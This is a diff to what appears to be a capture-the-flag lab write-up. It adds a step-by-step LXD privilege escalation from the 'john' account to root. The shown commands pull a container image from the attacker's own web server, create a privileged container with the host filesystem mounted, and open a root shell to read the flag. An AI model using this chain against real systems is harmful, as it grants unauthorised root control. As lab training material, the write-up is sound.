@@ -175,12 +175,97 @@ john@exploitable:~$
 john@exploitable:~$ cat user.txt 
 (REDACTED)
 ```
+#### I started looking into how to escalate privileges. I couldn't run sudo -l, so I checked the user and group information, which can be especially important when managing permissions and access control.
+```
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+```
+#### The lxd group seemed important so I checked it out.
+```
+john@exploitable:~$ lxd
+Error: This must be run as root
+```
+#### On reading around I found a way it can be used to escalate privileges on [Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/). 
+#### First I downloaded lxd apline builder
+```
+└─$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine     
+--2023-09-10 18:51:10--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8060 (7.9K) [text/plain]
+Saving to: ‘build-alpine.1’
 
+build-alpine.1               100%[==============================================>]   7.87K  --.-KB/s    in 0s
 
+```
+#### I built the file using the command
+```
+sudo bash build-alpine
+```
+#### I got a .tar.gz file which I transferred to my attacker machine
+```
+└─$ ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
+```
+#### I created a web server to use to transfer the file into my victim machine then uploaded the file
+```
+└─$ sudo python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.6.57 - - [10/Sep/2023 19:10:35] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
+```
+#### I downloaded it on the victim's device.
+```
+john@exploitable:/tmp$ wget 10.*.*.*:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2023-09-10 16:10:35--  http://10.13.34.70:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.*.*.*:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’
 
+alpine-v3.13-x86_64-20210218 100%[==============================================>]   3.11M   330KB/s    in 11s     
 
-
-
+2023-09-10 16:10:47 (292 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
+```
+#### I then started building the image file in the victim’s machine
+```
+john@exploitable:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
+john@exploitable:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 10, 2023 at 4:15pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+john@exploitable:/tmp$ lxc start ignite
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+```
+#### On running lxc exec ignite /bin/sh I got root
+```
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+~ # whoami
+root
+~ # pwd
+/root
+~ # id
+uid=0(root) gid=0(root)
+```
+#### I then got the flag on the /mnt directory where we had mounted our root folder to from this earlier command
+```
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+```
+####  the flag
+```
+/mnt/root # cd ..
+/mnt # ls
+root
+/mnt # cat root/root/root.txt 
+(REDACTED)
+```
 
 
 
